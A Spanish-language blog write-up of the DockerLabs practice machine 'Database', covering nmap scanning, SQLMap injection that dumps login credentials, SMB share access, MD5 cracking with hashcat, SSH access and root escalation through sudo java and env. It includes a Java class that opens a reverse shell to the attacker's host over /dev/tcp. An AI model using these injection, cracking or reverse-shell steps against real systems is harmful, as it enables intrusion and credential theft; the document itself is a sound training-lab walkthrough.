---
layout: post
title: Maquina Database
subtitle: DockerLabs
header-img: img/in-post/2020-10-07/database-dl.png
header-style: text
catalog: true
tags:
  -  DockerLabs
  -  SQL Injection
  -  SMBMap
  -  Escalado de privilegios
  -  Reverse Shell
---

#### **Información**
- **Máquina:** Database
- **Plataforma:** [DockerLabs](https://dockerlabs.es/)
- **Creador:** El Pingüino de Mario
- **SO:** Linux
- **Dificultad:** `Medio`{:.warning}

#### **Configuración Entorno**
Primeramente, como siempre para configurar las máquinas de DockerLabs, exportamos los ficheros auto_deploy.sh y en este caso pinguinazo.tar.
Para ejecutarlo utilizamos el siguiente comando:
```bash
sudo bash auto_deploy.sh pinguinazo.tar
```
![Image 1](https://aanton94.github.io/blog/img/posts/dl/database/img1.png)

**auto_deploy.sh:** este archivo se encarga de desplegar la máquina mediante docker y, una vez presionamos `ctrl+c`{:.info} pasa a un proceso de borrado, todo automático, sin necesidad de tener conocimientos de docker.

**database.tar:** contiene todo el contenido de la máquina docker; es el corazón, donde está la máquina víctima.

#### **Reconocimiento**
Lo primero que realizamos es lanzar un ping contra la IP de la máquina para comprobar que tenemos conectividad.
```bash
ping -c 1 172.17.0.2
```
![Image 2](https://aanton94.github.io/blog/img/posts/dl/collections/img2.png)

Podemos observar que el ttl es de 64, por tanto, como norma general podemos afirmas que se trata de una maquina linux.
Una vez comprobada la conectividad, iniciaremos un escaneo con nmap, para detectar puertos abiertos y lo almacenaremos en un fichero llamado scan, con el siguiente comando:
```bash
nmap -p- --open -sV -sC -sS --min-rate=5000 -vvv -n -Pn 172.17.0.2 -oN scan
```
- **-p-** --> Búsqueda de puertos abiertos
- **--open** --> Enumera los puertos abiertos
- **-sS** --> Es un modo de escaneo rápido
- **-sC** --> Que use un conjunto de scripts de reconocimiento
- **-sV** --> Que encuentre la versión del servicio abierto
- **--min-rate=5000** --> Hace que el reconocimiento aun vaya más rápido mandando no menos de 5000 paquetes
- **-n** --> No hace resolución DNS
- **-Pn** --> No hace ping
- **-vvv** --> Muestra en pantalla a medida que encuentra puertos (Verbose)
![Image 3](https://aanton94.github.io/blog/img/posts/dl/database/img3.png)


Vemos que tiene abiertos los puertos **22 (ssh)**, **80 (http)** y los puertos **139 y 445 (SMB)**.

#### **Explotación**
Lo primero que hacemos es acceder vía web por el puerto 80.
![Image 4](https://aanton94.github.io/blog/img/posts/dl/database/img4.png)

Nos encontramos con un login.
Utilizaremos gobuster para hacer fuzzing web y intentar encontrar directorios o archivos.
![Image 5](https://aanton94.github.io/blog/img/posts/dl/database/img5.png)

No encontramos nada relevante, por tanto, nos centraremos en el login que tenemos. Probamos a realizar sql injection para ver si el login es vulnerable a este tipo de ataques. Para ello utilizaremos la herramienta **SQLMap**.

Comenzamos con el siguiente comando para intentar descubrir las bases de datos:
```bash
sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch 
```
![Image 8](https://aanton94.github.io/blog/img/posts/dl/database/img8.png)

Vemos una tabla llamada **register** que podría contener credenciales o usuarios de nuestro interés. Trataremos de ver las tablas que contiene esa base de datos.
```bash
sqlmap -u http://172.17.0.2/index.php --forms -D register  --tables –batch
```
![Image 9](https://aanton94.github.io/blog/img/posts/dl/database/img9.png)

Tenemos la tabla users, trataremos de ver la información que contiene esta tabla.
```bash
sqlmap -u http://172.17.0.2/index.php --forms -T users  --cols --batch  
```
![Image 10](https://aanton94.github.io/blog/img/posts/dl/database/img10.png)

Tenemos una columna **passwd** y **username**. Para visualizar el contenido utilizamos el siguiente comando.
```bash
sqlmap -u http://172.17.0.2/index.php --forms -C username,passwd --dump  --batch 
```
![Image 11](https://aanton94.github.io/blog/img/posts/dl/database/img11.png)

Encontramos el usuario **dylan** y su contraseña. Si tratamos de acceder, nos lo permite, pero al acceder no vemos nada destacable. También tratamos de acceder vía **SSH** por el puerto 22, y tampoco tenemos suerte!!!

Visto que por estas vías no logramos avanzar, trataremos de atacar a los puertos abiertos de **SMB**, para ello utilizaremos la herramienta **SMBMAP**.
![Image 12](https://aanton94.github.io/blog/img/posts/dl/database/img12.png)

Encontramos una carpeta compartida llamada **shared**, trataremos de conectarnos con el usuario encontrado anteriormente.
![Image 13](https://aanton94.github.io/blog/img/posts/dl/database/img13.png)

Nos descargamos el archivo que hemos encontrado y realizamos un cat para visualizarlo, nos encontramos con un codigo en MD5, por lo tanto para poder descifrarlo utilizaremos **hascat**.
```bash
hashcat -m 0 -a 0 061fba5bdfc076bb7362616668de87c8 /usr/share/wordlists/rockyou.txt
```
![Image 14](https://aanton94.github.io/blog/img/posts/dl/database/img14.png)

Con el usuario **august** y la contraseña que hemos encontrado sí que logramos estableces una conexión vía **SSH**.
![Image 15](https://aanton94.github.io/blog/img/posts/dl/database/img15.png)

Una vez dentro de la máquina, trataremos de lograr escalar privilegios.
![Image 16](https://aanton94.github.io/blog/img/posts/dl/database/img16.png)

Si hacemos un sudo -l vemos que podemos ejecutar el binario java como dylan y así poder escalar a su usuario.
Vamos a crear un script en java para que nos mande una reverse shell con el usuario dylan.

```java
public class Shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/4444 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```
En nuestra maquina atacante, nos ponemos en escucha por el puerto 4444 con NetCat.
![Image 18](https://aanton94.github.io/blog/img/posts/dl/database/img18.png)

Recibimos la shell con el usuario dylan, no nos deja ejecutar sudo -l, por lo tanto buscamos los binarios.
![Image 19](https://aanton94.github.io/blog/img/posts/dl/database/img19.png)

Consultamos [https://gtfobins.github.io/](https://gtfobins.github.io/) para encontrar una manera de elevar privilegios con env. Luego, ejecutamos el siguiente comando:
```bash
env /bin/bash -p
```
![Image 20](https://aanton94.github.io/blog/img/posts/dl/database/img20.png)

¡¡¡¡Así que, hemos conseguido ser `root`{:.success}!!!! 

#### **Eliminación del entorno**

Para borrar la máquina solo debemos ir a la consola donde lo desplegamos y presionar `ctrl+c`{:.info} y eliminaría y borraría todo rastro de la máquina víctima en nuestro sistema LINUX.

![Image 21](https://aanton94.github.io/blog/img/posts/dl/database/img21.png)

`¡¡¡Espero que os haya gustado y nos vemos en la próxima!!!`{:.success}
